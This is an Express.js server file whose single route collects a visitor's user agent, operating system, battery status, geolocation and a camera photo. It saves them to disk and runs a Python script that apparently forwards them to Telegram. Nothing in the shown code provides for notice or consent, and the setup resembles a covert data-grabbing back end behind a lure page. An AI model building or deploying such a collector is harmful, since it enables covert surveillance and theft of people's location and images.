const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors'); // Enable CORS
const { exec } = require('child_process');
const app = express();

// Use the PORT environment variable provided by Render
const PORT = process.env.PORT || 3000;

// Enable CORS for all routes
app.use(cors());

// Middleware to parse JSON body
app.use(bodyParser.json({ limit: '50mb' }));

// POST route to save user details and photo
app.post('/save-user-details', (req, res) => {
    const { userAgent, os, battery, location, photo } = req.body;

    // Log received data
    console.log('Received User Details:', { userAgent, os, battery, location });

    // Ensure user details and photo are provided
    if (!userAgent || !os || !battery || !location) {
        return res.status(400).send('User details are incomplete or missing');
    }
    if (!photo) {
        return res.status(400).send('Photo data is missing or invalid');
    }

    // Create the 'data' folder if it doesn't exist
    const dataDir = path.join(__dirname, 'data');
    if (!fs.existsSync(dataDir)) {
        fs.mkdirSync(dataDir); // Create the 'data' folder
    }

    // Save the user details in the 'data/user-details.json' file
    const userDetailsPath = path.join(dataDir, 'user-details.json');
    const userDetails = { userAgent, os, battery, location };
    fs.writeFileSync(userDetailsPath, JSON.stringify(userDetails, null, 2));

    // Save the photo in the 'photos' folder
    const photoData = photo.replace(/^data:image\/png;base64,/, "");
    const photosDir = path.join(__dirname, 'photos');
    if (!fs.existsSync(photosDir)) {
        fs.mkdirSync(photosDir); // Create the 'photos' folder
    }

    const photoPath = path.join(photosDir, `photo-${Date.now()}.png`);
    fs.writeFileSync(photoPath, photoData, 'base64'); // Save the photo as a PNG file

    // Respond to the frontend
    res.status(200).json({ message: 'User details and photo saved successfully', filePath: photoPath });

    // Trigger Python script to send the photo and user details to Telegram
    exec('python send_to_telegram.py', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing Python script: ${error}`);
            return;
        }
        console.log(`Python script output: ${stdout}`);
        if (stderr) {
            console.error(`Python script error output: ${stderr}`);
        }
    });
});

// Serve static files (like your HTML, CSS, etc.)
app.use(express.static(__dirname));

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
